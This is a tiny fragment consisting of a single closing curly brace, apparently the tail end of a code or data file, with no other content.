}
